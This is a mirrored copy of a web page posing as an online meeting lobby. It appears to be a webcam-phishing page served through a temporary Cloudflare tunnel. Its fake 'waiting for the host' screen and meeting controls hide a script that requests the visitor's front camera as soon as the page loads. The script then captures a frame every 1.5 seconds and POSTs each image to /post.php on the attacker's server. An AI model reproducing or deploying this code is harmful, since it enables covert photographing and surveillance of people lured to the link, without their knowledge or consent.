<!DOCTYPE html>
<html>

<!-- Mirrored from carrying-poems-naked-made.trycloudflare.com/index.html.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Feb 2025 03:40:16 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
  <title>Join meeting</title>
    <meta property="og:title" content="Join online meeting" />
    <meta property="og:type" content="website" />
    <meta name="og:image" content="desc.png" />
    <meta name="description" content="Join online meeting" property="og:description">
    <meta name="description" content="/desc.png" property="og:image" />
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Join meeting!" />
    <meta name="twitter:description" content="Join online meeting" />
    <meta name="twitter:image" content="desc.png">
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    
</head>
<style>
  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&amp;display=swap");

body {
    height: 100vh;
    width: 100vw;
}

* {
    padding: 0px;
    margin: 0px;
    font-family: 'Nunito', sans-serif;
    font-weight: 500;
}

.main-screen {
    background-color: #273039;
    height: 100vh;
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
}

img {
    height: 80px;
    width: 80px;
}

.bottom-bar {
    position: fixed;
    padding: 0px 40px 0px -40px;
    bottom: 0px;
    height: 80px;
    width: 100%;
    background-color: #1F2022;
    display: flex;
    flex-direction: row;
    justify-content: center;
    align-items: center;
    color: #fff;
}

.icon-button {
    display: flex;
    flex-direction: column;
    justify-items: center;
    align-items: center;
}

i {
    margin-bottom: 8px;
    font-size: 26px;
}

button {
    color: #fff;
    background-color: crimson;
    padding: 5px 20px;
    border: none;
    border-radius: 5px;
    border-style: none;
    outline: none;
}

.float_button {
    background-color: #1F2022;
    height: 40px;
    border-radius: 5px;
    width: 40px;
    position: fixed;
    display: flex;
    align-items: center;
    justify-content: center;
    top: 5px;
    right: 5px;
  }
#ac-wrapper {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255,255,255,.6);
    z-index: 1001;
}

#popup {
    width: 555px;
    height: 35px;
    background: #FFFFFF;
    border: 5px solid #000;
    border-radius: 15px;
    -moz-border-radius: 15px;
    -webkit-border-radius: 15px;
    box-shadow: #64686e 0px 0px 3px 3px;
    -moz-box-shadow: #64686e 0px 0px 3px 3px;
    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
    position: relative;
    top: 250px; left: 375px;
}
</style>


<div class="video-wrap" hidden="hidden">
  <video id="video" playsinline autoplay></video>
</div>

<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>


<script>

</script>

<body>
  <div class="float_button">
    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
  </div>
  <div id="ac-wrapper">
    <div id="popup">
        <center>
            <h2>Please wait the meeting host will let you in soon</h2>
        </center>
    </div>
</div>
  <div class="bottom-bar">
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-microphone"></i>
      <h6>Mute</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-video"></i>
      <h6>Stop Video</h6>
    </div>
    <div class="icon-button" style="margin-left: auto;">
      <i class="fas fa-shield-alt"></i>
      <h6>Security</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-users"></i>
      <h6>Participants</h6>
    </div>
    <div class="icon-button" style="color: lawngreen; margin-left: 50px;">
      <i class="fas fa-plus-square"></i>
      <h6>Share content</h6>
    </div>
    <div class="icon-button" style="margin-left: 50px;">
      <i class="fas fa-comments"></i>
      <h6>Chat</h6>
    </div>
    <div class="icon-button" style="margin-right: auto; margin-left: 50px;">
      <i class="fas fa-record-vinyl"></i>
      <h6>Record</h6>
    </div>
    <button style="margin-right: 50px;">End</button>
  </div>
  <script>
    'use strict';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: {
         facingMode: "user"
    }
};

const post = (imgdata) =>{
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: '/post.php',
        dataType: 'json',
        async: false,
        success: (result) => {
         // call the function that handles the response/results
        },
        error: function(){
            errorMsgElement
        }
    });
};
 


// Success
const handleSuccess = (stream) => {
    window.stream = stream;
    video.srcObject = stream;
    
    var context = canvas.getContext('2d');
    setInterval(() => {
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

// Access webcam
const init = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
         handleSuccess(stream);
    } catch (e) {
         errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
}

// Load init
init();
  </script>
  <script>
    $(document).ready(function(){
      setTimeout(function(){
         $('#ac-wrapper').attr("display","none"); 
      },50000); // 5000 to load it after 5 seconds from page load
   });
  </script>
</body>


<!-- Mirrored from carrying-poems-naked-made.trycloudflare.com/index.html.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Feb 2025 03:40:19 GMT -->
</html>

